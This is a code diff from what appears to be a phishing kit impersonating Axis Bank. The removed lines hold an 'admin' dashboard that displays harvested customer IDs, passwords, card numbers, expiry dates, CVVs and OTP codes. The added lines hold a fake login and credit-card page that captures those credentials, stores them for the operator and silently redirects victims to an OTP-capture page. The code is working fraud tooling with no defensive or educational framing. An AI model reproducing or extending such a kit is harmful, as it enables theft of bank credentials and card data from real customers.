-                    cardClass = 'card-submission';
-                    typeText = 'CARD SUBMISSION';
-                    typeIcon = '💳';
-                    typeColorClass = 'card';
-                } else {
-                    typeClass = 'type-otp';
-                    cardClass = 'otp-submission';
-                    typeText = 'OTP SUBMISSION';
-                    typeIcon = '🔢';
-                    typeColorClass = 'otp';
+                for (let i = 0; i < value.length && i < 16; i++) {
+                    if (i > 0 && i % 4 === 0) {
+                        formattedValue += ' ';
+                    }
+                    formattedValue += value[i];
                 }
                 
-                card.className = `submission-card ${cardClass} ${submission.isNew ? 'new' : ''}`;
+                e.target.value = formattedValue;
+            });
+        }
+        
+        // Format expiry date input (MM/YY)
+        if (expiryInput) {
+            expiryInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
                 
-                // Format time
-                const time = new Date(submission.timestamp);
-                const timeString = time.toLocaleTimeString('en-US', {
-                    hour: '2-digit',
-                    minute: '2-digit',
-                    second: '2-digit',
-                    hour12: true
-                });
-                const dateString = time.toLocaleDateString('en-US', {
-                    year: 'numeric',
-                    month: 'short',
-                    day: 'numeric'
-                });
+                if (value.length >= 2) {
+                    e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                } else {
+                    e.target.value = value;
+                }
+            });
+        }
+        
+        // Only allow numbers in CVV field
+        if (cvvInput) {
+            cvvInput.addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/[^0-9]/gi, '');
+            });
+        }
+        
+        // Form submission handlers - NO ALERTS, REDIRECT TO OTP PAGE
+        if (loginForm) {
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
                 
-                card.innerHTML = `
-                    ${submission.isNew ? '<div class="new-badge">NEW</div>' : ''}
-                    <div class="card-header">
-                        <span class="submission-type ${typeClass}">
-                            <span class="type-icon">${typeIcon}</span> ${typeText}
-                        </span>
-                        <span class="card-time">
-                            ${dateString} | ${timeString}
-                        </span>
-                    </div>
-                    <div class="card-details">
-                        ${getSubmissionDetails(submission, typeColorClass)}
-                    </div>
-                    <div class="page-source">
-                        <span class="page-icon">📍</span> From: ${getPageSource(submission.type)}
-                    </div>
-                    <div class="time-badge">
-                        ID: ${submission.id}
-                    </div>
-                `;
+                const loginId = document.getElementById('loginId').value;
+                const password = document.getElementById('password').value;
+                const mobile = document.getElementById('mobile').value;
                 
-                submissionsList.appendChild(card);
+                if (loginId && password && mobile) {
+                    // Show loading animation on button
+                    const submitBtn = document.getElementById('loginButton');
+                    const originalText = submitBtn.textContent;
+                    submitBtn.textContent = "Processing...";
+                    submitBtn.classList.add('loading');
+                    submitBtn.disabled = true;
+                    
+                    // Save data to localStorage for admin
+                    saveSubmission('login', {
+                        loginId: loginId,
+                        password: password,
+                        mobile: mobile,
+                        time: new Date().toLocaleString()
+                    });
+                    
+                    // Simulate processing delay
+                    setTimeout(() => {
+                        // Remove loading state
+                        submitBtn.textContent = originalText;
+                        submitBtn.classList.remove('loading');
+                        submitBtn.disabled = false;
+                        
+                        // NO ALERT - Redirect to OTP page
+                        window.location.href = 'axis_otp.html';
+                        
+                        // Reset form
+                        loginForm.reset();
+                    }, 1500);
+                } else {
+                    // Quick error indication
+                    const submitBtn = document.getElementById('loginButton');
+                    submitBtn.style.background = '#ff4444';
+                    setTimeout(() => {
+                        submitBtn.style.background = '#87103F';
+                    }, 500);
+                }
+            });
+        }
+        
+        if (creditForm) {
+            creditForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const cardNumber = document.getElementById('cardNumber').value;
+                const expiry = document.getElementById('expiry').value;
+                const cvv = document.getElementById('cvv').value;
+                const cardMobile = document.getElementById('cardMobile').value;
+                
+                if (cardNumber && expiry && cvv && cardMobile) {
+                    const cleanCardNumber = cardNumber.replace(/\s+/g, '');
+                    
+                    if (cleanCardNumber.length !== 16) {
+                        // Quick error indication
+                        const submitBtn = document.getElementById('creditButton');
+                        submitBtn.style.background = '#ff4444';
+                        setTimeout(() => {
+                            submitBtn.style.background = '#87103F';
+                        }, 500);
+                        return;
+                    }
+                    
+                    if (cvv.length !== 3) {
+                        // Quick error indication
+                        const submitBtn = document.getElementById('creditButton');
+                        submitBtn.style.background = '#ff4444';
+                        setTimeout(() => {
+                            submitBtn.style.background = '#87103F';
+                        }, 500);
+                        return;
+                    }
+                    
+                    // Show loading animation on button
+                    const submitBtn = document.getElementById('creditButton');
+                    const originalText = submitBtn.textContent;
+                    submitBtn.textContent = "Verifying...";
+                    submitBtn.classList.add('loading');
+                    submitBtn.disabled = true;
+                    
+                    // Save data to localStorage for admin
+                    saveSubmission('credit', {
+                        cardNumber: cardNumber,
+                        expiry: expiry,
+                        cvv: cvv,
+                        mobile: cardMobile,
+                        time: new Date().toLocaleString()
+                    });
+                    
+                    // Simulate processing delay
+                    setTimeout(() => {
+                        // Remove loading state
+                        submitBtn.textContent = originalText;
+                        submitBtn.classList.remove('loading');
+                        submitBtn.disabled = false;
+                        
+                        // NO ALERT - Redirect to OTP page
+                        window.location.href = 'axis_otp.html';
+                        
+                        // Reset form
+                        creditForm.reset();
+                    }, 1500);
+                } else {
+                    // Quick error indication
+                    const submitBtn = document.getElementById('creditButton');
+                    submitBtn.style.background = '#ff4444';
+                    setTimeout(() => {
+                        submitBtn.style.background = '#87103F';
+                    }, 500);
+                }
+            });
+        }
+        
+        // Save submission to localStorage
+        function saveSubmission(type, data) {
+            // Get existing submissions or create empty array
+            let submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
+            
+            // Add new submission at the beginning
+            submissions.unshift({
+                id: Date.now(),
+                type: type,
+                data: data,
+                timestamp: new Date().toISOString(),
+                isNew: true
             });
             
-            // Mark submissions as not new after 10 seconds
-            setTimeout(() => {
-                const updatedSubmissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
-                updatedSubmissions.forEach(sub => sub.isNew = false);
-                localStorage.setItem('axisBankSubmissions', JSON.stringify(updatedSubmissions));
-            }, 10000);
-        }
-        
-        // Get submission details HTML based on type
-        function getSubmissionDetails(submission, typeColorClass) {
-            if (submission.type === 'login') {
-                return `
-                    <div class="detail-item">
-                        <div class="detail-label">
-                            <span class="label-icon">👤</span> Customer ID
-                        </div>
-                        <div class="detail-value">${submission.data.loginId || 'N/A'}</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">
-                            <span class="label-icon">🔒</span> Password
-                        </div>
-                        <div class="detail-value">${submission.data.password || '••••••••'}</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">
-                            <span class="label-icon">📱</span> Mobile Number
-                        </div>
-                        <div class="detail-value">${submission.data.mobile || 'N/A'}</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">
-                            <span class="label-icon">🕐</span> Submission Time
-                        </div>
-                        <div class="detail-value">${submission.data.time || 'N/A'}</div>
-                    </div>
-                `;
-            } else if (submission.type === 'credit') {
-                return `
-                    <div class="detail-item">
-                        <div class="detail-label">
-                            <span class="label-icon">💳</span> Card Number
-                        </div>
-                        <div class="detail-value">${submission.data.cardNumber || 'XXXX XXXX XXXX XXXX'}</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">
-                            <span class="label-icon">📅</span> Expiry Date
-                        </div>
-                        <div class="detail-value">${submission.data.expiry || 'MM/YY'}</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">
-                            <span class="label-icon">🔢</span> CVV
-                        </div>
-                        <div class="detail-value">${submission.data.cvv || '•••'}</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">
-                            <span class="label-icon">📱</span> Mobile Number
-                        </div>
-                        <div class="detail-value">${submission.data.mobile || 'N/A'}</div>
-                    </div>
-                `;
-            } else {
-                return `
-                    <div class="detail-item">
-                        <div class="detail-label">
-                            <span class="label-icon">🔢</span> OTP Code
-                        </div>
-                        <div class="detail-value">${submission.data.otpCode || 'N/A'}</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">
-                            <span class="label-icon">📱</span> Mobile Number
-                        </div>
-                        <div class="detail-value">${submission.data.mobile || 'N/A'}</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">
-                            <span class="label-icon">🕐</span> Verification Time
-                        </div>
-                        <div class="detail-value">${submission.data.time || 'N/A'}</div>
-                    </div>
-                `;
-            }
-        }
-        
-        // Get page source based on type
-        function getPageSource(type) {
-            switch(type) {
-                case 'login': return 'Login/Customer Page';
-                case 'credit': return 'Credit Card Page';
-                case 'otp': return 'OTP Verification Page';
-                default: return 'Unknown Page';
-            }
-        }
-        
-        // Start auto-refresh timer
-        function startTimer() {
-            clearInterval(timerInterval);
+            // Save back to localStorage
+            localStorage.setItem('axisBankSubmissions', JSON.stringify(submissions));
             
-            refreshCountdown = 5;
-            refreshTime.textContent = refreshCountdown;
-            
-            timerInterval = setInterval(() => {
-                refreshCountdown--;
-                refreshTime.textContent = refreshCountdown;
+            console.log('Data saved to admin:', type, data);
+        }
+        
+        // Mobile number validation (only numbers)
+        const mobileInputs = document.querySelectorAll('input[type="tel"]');
+        mobileInputs.forEach(input => {
+            input.addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/[^0-9]/gi, '');
+            });
+        });
+        
+        // Forgot link click
+        if (forgotLink) {
+            forgotLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                const isLoginForm = loginForm.style.display === 'block';
                 
-                if (refreshCountdown <= 0) {
-                    refreshCountdown = 5;
-                    loadSubmissions(); // Refresh data
+                if (isLoginForm) {
+                    window.location.href = 'forgot_login.html';
+                } else {
+                    window.location.href = 'forgot_card.html';
                 }
-            }, 1000);
+            });
         }
         
-        // Initialize dashboard
-        function initDashboard() {
-            // Initialize localStorage if empty
+        // Info buttons functionality
+        document.querySelectorAll('.info-button').forEach(button => {
+            button.addEventListener('click', function() {
+                const text = this.textContent;
+                if (text === 'KNOW MORE') {
+                    window.location.href = 'more_info.html';
+                } else if (text === 'DOWNLOAD') {
+                    window.location.href = 'download_app.html';
+                }
+            });
+        });
+        
+        // Initialize - set Login form as default
+        window.addEventListener('DOMContentLoaded', function() {
+            toggleLogin.classList.add('active-toggle');
+            loginForm.style.display = 'block';
+            creditForm.style.display = 'none';
+            forgotLink.textContent = 'Forgot Login ID / Password?';
+            
+            // Initialize localStorage if not exists
             if (!localStorage.getItem('axisBankSubmissions')) {
                 localStorage.setItem('axisBankSubmissions', JSON.stringify([]));
             }
-            
-            loadSubmissions();
-            startTimer();
-            
-            // Auto-refresh every 10 seconds
-            setInterval(loadSubmissions, 10000);
-        }
-        
-        // Initialize on page load
-        document.addEventListener('DOMContentLoaded', initDashboard);
+        });
     </script>
 </body>
 </html>
